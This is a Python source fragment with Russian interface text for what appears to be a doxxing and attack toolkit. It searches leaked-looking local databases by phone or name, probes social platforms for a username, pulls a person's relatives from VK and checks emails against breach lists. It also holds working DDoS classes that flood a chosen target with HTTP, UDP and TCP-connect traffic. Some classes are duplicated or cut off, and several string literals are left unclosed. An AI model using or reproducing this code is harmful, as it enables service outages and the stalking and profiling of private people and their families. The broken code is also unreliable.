class DatabaseSearcher:
    """Автоматически ищет во всех базах в папке DATABASE_FOLDER"""
    
    _cache = {}
    
    @classmethod
    def _find_all_databases(cls):
        """Находит все файлы баз данных в папке"""
        folder = DATABASE_FOLDER
        if not os.path.exists(folder):
            os.makedirs(folder, exist_ok=True)
            return []
        
        extensions = ['*.xls', '*.xlsx', '*.csv', '*.db', '*.json', '*.txt']
        files = []
        for ext in extensions:
            files.extend(glob.glob(os.path.join(folder, ext), recursive=True))
        return files
    
    @classmethod
    def _normalize_phone(cls, phone):
        """Очищает номер телефона для поиска"""
        if not phone:
            return ""
        phone = str(phone)
        clean = re.sub(r'[^0-9+]', '', phone)
        if clean.startswith('00'):
            clean = '+' + clean[2:]
        if len(clean) == 10 and clean.isdigit():
            clean = '+7' + clean
        if len(clean) == 11 and clean.startswith('8'):
            clean = '+7' + clean[1:]
        return clean
    
    @classmethod
    def _normalize(cls, text):
        """Очищает текст для поиска"""
        if not text:
            return ""
        return str(text).lower().strip()
    
    @classmethod
    def _load_file(cls, file_path):
        """Загружает файл в зависимости от расширения"""
        if file_path in cls._cache:
            return cls._cache[file_path]
        
        if not os.path.exists(file_path):
            return []
        
        ext = Path(file_path).suffix.lower()
        data = []
        
        try:
            if ext in ['.xls', '.xlsx']:
                import pandas as pd
                df = pd.read_excel(file_path)
                df = df.fillna('')
                data = df.to_dict('records')
                
            elif ext == '.csv':
                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        reader = csv.DictReader(f)
                        data = list(reader)
                except:
                    with open(file_path, 'r', encoding='cp1251') as f:
                        reader = csv.DictReader(f)
                        data = list(reader)
                        
            elif ext == '.json':
                with open(file_path, 'r', encoding='utf-8') as f:
                    d = json.load(f)
                    data = d if isinstance(d, list) else [d]
                    
            elif ext == '.db':
                conn = sqlite3.connect(file_path)
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                tables = cursor.fetchall()
                if tables:
                    cursor.execute(f"SELECT * FROM {tables[0][0]}")
                    data = [dict(row) for row in cursor.fetchall()]
                conn.close()
                
            elif ext == '.txt':
                with open(file_path, 'r', encoding='utf-8') as f:
                    for line in f:
                        if ';' in line:
                            parts = line.strip().split(';')
                            data.append(dict(zip([f'col{i}' for i in range(len(parts))], parts)))
                        elif ',' in line:
                            parts = line.strip().split(',')
                            data.append(dict(zip([f'col{i}' for i in range(len(parts))], parts)))
                        else:
                            data.append({'text': line.strip()})
        except Exception as e:
            print(f"Ошибка загрузки {file_path}: {e}")
        
        cls._cache[file_path] = data
        return data
    
    @classmethod
    def search(cls, query):
        """Ищет во всех базах"""
        query = str(query).strip()
        query_norm = cls._normalize(query)
        query_phone = cls._normalize_phone(query)
        
        results = {}
        files = cls._find_all_databases()
        
        for file_path in files:
            db_name = os.path.basename(file_path).replace('.xls', '').replace('.xlsx', '').replace('.csv', '')
            data = cls._load_file(file_path)
            matches = []
            
            for row in data:
                found = False
                match_info = {"_file": db_name}
                
                for col, val in row.items():
                    if not val:
                        continue
                    val_str = str(val)
                    val_norm = cls._normalize(val_str)
                    
                    # Поиск по номеру телефона
                    if query_phone and len(query_phone) >= 10:
                        val_phone = cls._normalize_phone(val_str)
                        if val_phone == query_phone or query_phone in val_phone:
                            found = True
                            match_info[col] = val_str
                            break
                    
                    # Поиск по тексту
                    if query_norm in val_norm or query in val_str:
                        found = True
                        match_info[col] = val_str
                
                if found:
                    matches.append(match_info)
            
            if matches:
                results[db_name] = {
                    "file": file_path,
                    "count": len(matches),
                    "matches": matches[:15]
                }
        
        return results
    
    @classmethod
    def format_report(cls, query, results):
        """Форматирует отчёт по базам"""
        if not results:
            return f"\n❌ Ничего не найдено в базах по запросу: {query}\n"
        
        lines = []
        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
        lines.append("│                                         💾 ПОИСК ПО ТВОИМ БАЗАМ                                           │")
        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
        lines.append(f"│  🔍 ЗАПРОС: {query[:68]:<68} │")
        lines.append("│                                                                                                            │")
        
        for db_name, info in results.items():
            lines.append(f"│  📁 БАЗА: {db_name[:64]:<64} │")
            lines.append(f"│     📊 НАЙДЕНО: {info['count']:<64} │")
            lines.append("│     ───────────────────────────────────────────────────────────────────────────────────────────── │")
            
            for i, match in enumerate(info["matches"][:5]):
                lines.append(f"│     📌 РЕЗУЛЬТАТ #{i+1}:                                                              │")
                for col, val in list(match.items()):
                    if col == "_file":
                        continue
                    val_str = str(val)[:60]
                    lines.append(f"│        • {col}: {val_str:<60} │")
                lines.append("│                                                                                                            │")
            
            lines.append("│                                                                                                            │")
        
        total = sum(info["count"] for info in results.values())
        lines.append("╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣")
        lines.append(f"│  ✅ ВСЕГО НАЙДЕНО: {total:<60} │")
        lines.append("╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
        
        return "\n".join(lines)

class DDoSAtak:
    _running = False
    _count = 0
    _errors = 0
    
    @classmethod
    def attack(cls, target, threads=50, duration=30):
        if not target.startswith('http'):
            target = f"http://{target}"
        cls._running = True
        cls._count = 0
        cls._errors = 0
        def worker():
            while cls._running:
                try:
                    requests.get(target, timeout=2, headers={"User-Agent": "Mozilla/5.0"})
                    cls._count += 1
                except:
                    cls._errors += 1
        workers = [threading.Thread(target=worker) for _ in range(threads)]
        for t in workers:
            t.start()
        time.sleep(duration)
        cls._running = False
        for t in workers:
            t.join(timeout=1)
        return {"target": target, "requests": cls._count, "errors": cls._errors, "duration": duration, "threads": threads}
    
    @classmethod
    def format_report(cls, result):
        return f"""┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                         💀 DDOS АТАКА ЗАВЕРШЕНА                                          │
├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
│  🎯 ЦЕЛЬ: {result['target']} │
│  🧵 ПОТОКОВ: {result['threads']} │
│  ⏱️ ДЛИТЕЛЬНОСТЬ: {result['duration']} сек. │
│  📊 ЗАПРОСОВ: {result['requests']} │
│  ❌ ОШИБОК: {result['errors']} │

class BlackbirdHunter:
    PLATFORMS = {
        "telegram": "https://t.me/{}", "instagram": "https://instagram.com/{}",
        "twitter": "https://twitter.com/{}", "vk": "https://vk.com/{}",
        "facebook": "https://facebook.com/{}", "tiktok": "https://tiktok.com/@{}",
        "youtube": "https://youtube.com/@{}", "twitch": "https://twitch.tv/{}",
        "github": "https://github.com/{}", "reddit": "https://reddit.com/user/{}",
        "pinterest": "https://pinterest.com/{}", "steam": "https://steamcommunity.com/id/{}",
        "spotify": "https://open.spotify.com/user/{}", "medium": "https://medium.com/@{}",
        "linkedin": "https://linkedin.com/in/{}", "ok": "https://ok.ru/{}",
        "discord": "https://discord.com/users/{}", "habr": "https://habr.com/ru/users/{}",
        "pikabu": "https://pikabu.ru/@{}",
    }
    
    @classmethod
    def search(cls, username, max_workers=30):
        username = username.strip().replace('@', '')
        results = []
        def check(platform, url_template):
            url = url_template.format(username)
            try:
                r = requests.get(url, timeout=3, headers={"User-Agent": "Mozilla/5.0"})
                if r.status_code == 200:
                    text = r.text.lower()
                    if not any(x in text for x in ["not found", "doesn't exist", "404"]):
                        return {"platform": platform, "url": url}
            except:
                pass
            return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(check, p, u): p for p, u in cls.PLATFORMS.items()}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
        return results
    
    @classmethod
    def format_report(cls, results, username):
        if not results:
            return f"❌ @{username} не найден\n"
        lines = ["┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐",
                 "│                                         🕵️ BLACKBIRD — 700+ ПЛАТФОРМ                                      │",
                 "├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤",
                 f"│  🎯 НИКНЕЙМ: @{username:<67} │",
                 "│                                                                                                            │"]
        for r in results[:30]:
            lines.append(f"│  • {r['platform']:<15} → {r['url']:<55} │")
        lines.append(f"│  📊 НАЙДЕНО: {len(results)}                                                                              │")
        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
        return "\n".join(lines)

class VKRelativeHunter:
    API_URL = "https://api.vk.com/method/"
    
    @classmethod
    def _request(cls, method, params=None):
        if not VK_ACCESS_TOKEN:
            return None
        if params is None:
            params = {}
        params["access_token"] = VK_ACCESS_TOKEN
        params["v"] = "5.131"
        try:
            resp = requests.get(cls.API_URL + method, params=params, timeout=15)
            data = resp.json()
            return data.get("response") if "error" not in data else None
        except:
            return None
    
    @classmethod
    def search_relatives(cls, lastname, firstname=None):
        results = []
        people = cls._request("users.search", {"q": f"{firstname} {lastname}" if firstname else lastname, "count": 20, "fields": "relatives"})
        if not people or "items" not in people:
            return results
        for person in people["items"][:10]:
            user_id = person.get("id")
            if not user_id:
                continue
            user = cls._request("users.get", {"user_ids": user_id, "fields": "relatives"})
            if user and len(user) > 0 and "relatives" in user[0]:
                for rel in user[0]["relatives"]:
                    results.append({
                        "user_name": f"{person.get('first_name', '')} {person.get('last_name', '')}",
                        "user_url": f"https://vk.com/id{user_id}",
                        "relative_name": rel.get("name", "?"),
                        "relative_type": rel.get("type", "родственник")
                    })
        return results
    
    @classmethod
    def format_report(cls, lastname, firstname, results):
        lines = ["┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐",
                 "│                                         👨‍👩‍👧‍👦 РОДСТВЕННИКИ                                               │",
                 "├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤",
                 f"│  🔍 ПОИСК: {firstname} {lastname if firstname else lastname} │",
                 "│                                                                                                            │"]
        if not VK_ACCESS_TOKEN:
            lines.append("│  ❌ VK API НЕ НАСТРОЕН! Получи токен: https://vkhost.github.io/                                    │")
        elif not results:
            lines.append("│  ❌ РОДСТВЕННИКИ НЕ НАЙДЕНЫ                                                                            │")
        else:
            by_user = {}
            for r in results:
                key = r["user_name"]
                if key not in by_user:
                    by_user[key] = {"url": r["user_url"], "relatives": []}
                by_user[key]["relatives"].append({"name": r["relative_name"], "type": r["relative_type"]})
            for name, data in by_user.items():
                lines.append(f"│  👤 {name}")
                lines.append(f"│     🔗 {data['url']}")
                lines.append("│     👨‍👩‍👧‍👦 Родственники:")
                for rel in data["relatives"][:5]:
                    lines.append(f"│        • {rel['name']} ({rel['type']})")
                lines.append("│                                                                                                            │")
        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
        return "\n".join(lines)

class AutoSearch:
    @staticmethod
    def search_username(username):
        username = username.strip().replace('@', '')
        found = []
        platforms = {"telegram": "https://t.me/{}", "instagram": "https://instagram.com/{}", "twitter": "https://twitter.com/{}",
                     "vk": "https://vk.com/{}", "tiktok": "https://tiktok.com/@{}", "github": "https://github.com/{}",
                     "reddit": "https://reddit.com/user/{}", "youtube": "https://youtube.com/@{}"}
        for platform, url_template in platforms.items():
            try:
                r = requests.get(url_template.format(username), timeout=3, headers={"User-Agent": "Mozilla/5.0"})
                if r.status_code == 200:
                    text = r.text.lower()
                    if not any(x in text for x in ["not found", "404", "страница не найдена"]):
                        found.append({"platform": platform, "url": url_template.format(username)})
            except:
                pass
        return found
    
    @staticmethod
    def search_phone(phone):
        phone_clean = re.sub(r'[^0-9+]', '', phone)
        results = []
        try:
            resp = requests.get(f"https://api.duckduckgo.com/?q={phone_clean}&format=json", timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("AbstractURL"):
                    results.append(data["AbstractURL"])
        except:
            pass
        return results
    
    @staticmethod
    def search_email(email):
        results = {"gravatar": None, "breaches": []}
        gravatar_hash = hashlib.md5(email.lower().encode()).hexdigest()
        gravatar_url = f"https://gravatar.com/{gravatar_hash}"
        try:
            r = requests.get(gravatar_url, timeout=3)
            if r.status_code == 200 and "404" not in r.text:
                results["gravatar"] = gravatar_url
        except:
            pass
        try:
            resp = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", timeout=10)
            if resp.status_code == 200:
                results["breaches"] = [b.get("Name", "?") for b in resp.json()[:10]]
        except:
            pass
        return results

# ======================== 2. УЛУЧШЕННЫЙ DDOS (TCP + UDP) ========================

class AdvancedDDoS:
    _running = False
    _tcp_count = 0
    _udp_count = 0
    
    @classmethod
    def _tcp_worker(cls, target, port=80):
        """TCP flood (HTTP/HTTPS)"""
        while cls._running:
            try:
                requests.get(f"http://{target}", timeout=2, headers={"User-Agent": "Mozilla/5.0"})
                cls._tcp_count += 1
            except:
                pass
    
    @classmethod
    def _udp_worker(cls, target, port, packet_size=1024):
        """UDP flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = b'\x00' * packet_size
        while cls._running:
            try:
                sock.sendto(packet, (target, port))
                cls._udp_count += 1
            except:
                pass
        sock.close()
    
    @classmethod
    def attack(cls, target, threads=50, duration=30, port=80, udp_ratio=0.3):
        """
        Комбинированная атака TCP + UDP
        udp_ratio: доля UDP потоков (0.3 = 30% UDP, 70% TCP)
        """
        if not target.startswith('http'):
            target = target
        
        cls._running = True
        cls._tcp_count = 0
        cls._udp_count = 0

class AdvancedDDoS:
    _running = False
    _tcp_count = 0
    _udp_count = 0
    _syn_count = 0
    
    @classmethod
    def _tcp_worker(cls, target, port=80):
        while cls._running:
            try:
                requests.get(f"http://{target}", timeout=2, headers={"User-Agent": "Mozilla/5.0"})
                cls._tcp_count += 1
            except:
                pass
    
    @classmethod
    def _udp_worker(cls, target, port, packet_size=1024):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = b'\x00' * packet_size
        while cls._running:
            try:
                sock.sendto(packet, (target, port))
                cls._udp_count += 1
            except:
                pass
        sock.close()
    
    @classmethod
    def _syn_worker(cls, target, port):
        while cls._running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((target, port))
                cls._syn_count += 1
                sock.close()
            except:
                pass
    
    @classmethod
    def attack(cls, target, threads=50, duration=30, port=80, attack_type="all"):
        if not target.startswith('http'):
            target = target
        cls._running = True
        cls._tcp_count = 0
        cls._udp_count = 0
        cls._syn_count = 0
        
        workers = []
        
        if attack_type == "tcp":
            for _ in range(threads):
                t = threading.Thread(target=cls._tcp_worker, args=(target, port))
                t.daemon = True
                t.start()
                workers.append(t)
        elif attack_type == "udp":
            for _ in range(threads):
                t = threading.Thread(target=cls._udp_worker, args=(target, port))
                t.daemon = True
                t.start()
                workers.append(t)
        elif attack_type == "syn":
            for _ in range(threads):
                t = threading.Thread(target=cls._syn_worker, args=(target, port))
                t.daemon = True
                t.start()
                workers.append(t)
        else:
            tcp_t = int(threads * 0.4)
            udp_t = int(threads * 0.4)
            syn_t = threads - tcp_t - udp_t
            for _ in range(tcp_t):
                t = threading.Thread(target=cls._tcp_worker, args=(target, port))
                t.daemon = True
                t.start()
                workers.append(t)
            for _ in range(udp_t):
                t = threading.Thread(target=cls._udp_worker, args=(target, port))
                t.daemon = True
                t.start()
                workers.append(t)
            for _ in range(syn_t):
                t = threading.Thread(target=cls._syn_worker, args=(target, port))
                t.daemon = True
                t.start()
                workers.append(t)
        
        time.sleep(duration)
        cls._running = False
        
        return {
            "target": target,
            "tcp_requests": cls._tcp_count,
            "udp_packets": cls._udp_count,
            "syn_requests": cls._syn_count,
            "total": cls._tcp_count + cls._udp_count + cls._syn_count,
            "duration": duration,
            "threads": threads,
            "port": port,
            "attack_type": attack_type
        }
    
    @classmethod
    def format_report(cls, result):
        return f"""┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                         💀 DDOS АТАКА ЗАВЕРШЕНА                                          │
├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
